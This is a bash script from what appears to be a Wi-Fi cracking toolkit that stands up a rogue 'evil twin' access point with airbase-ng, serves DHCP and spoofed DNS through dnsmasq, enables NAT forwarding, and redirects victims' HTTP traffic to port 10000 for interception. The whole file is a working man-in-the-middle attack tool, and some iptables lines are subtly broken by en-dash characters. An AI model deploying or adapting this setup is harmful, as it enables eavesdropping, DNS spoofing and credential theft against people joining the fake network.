#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wifi-crack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"
source "$CONFIG_INTERFACE"

source "${CONFIG_FAKEAP_FILE_DHCP}"
source "${CONFIG_FAKEAP_FILE_WIRELESS}"


#edit dhcp configuration
echo -e "
no-resolv
no-poll
interface=at0
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,12h
dhcp-option=3,$DHCP_SERVER
dhcp-option=6,$DHCP_SERVER
server=8.8.8.8
addn-hosts=\"${CONFIG_FAKEAP_FILE_FAKEDNS}\"
log-queries
log-dhcp
" > "${CONFIG_FAKEAP_FILE_DNSMASQ}"

#start fake ap
if [ -n "${FAKEAP_MAC}" ]; then
    $TERMINAL "airbase-ng -a $FAKEAP_MAC -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &

else
    $TERMINAL "airbase-ng -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &
fi
#ex: airbase-ng -e fake-ap -c 6 mon0
sleep 2


#IPTABLES
ifconfig at0 "${DHCP_SERVER}/24" up
#removing iptables rules
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#enable packet forward in iptables
iptables -P FORWARD ACCEPT
#link the wifi card and the card thats connected to the internet
iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE

#enable ip forward
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000

#ifconfig at0 192.168.1.1 netmask 255.255.255.0
#ifconfig at0 mtu 1400
#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables –t nat –A PREROUTNG –p udp –j DNAT –to <GATEWAY IP HERE>
#iptables –P FORWARD ACCEPT
#iptables --append FORWARD –-in-interface at0 –j ACCEPT
#iptables --table nat -append POSTROUTING --out-interface eth0 –j MASQUERADE
#iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000



#start dnsmasq
#/etc/init.d/dnsmasq restart
dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -d
# dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -H ${CONFIG_FAKEAP_FILE_FAKEDNS} -d
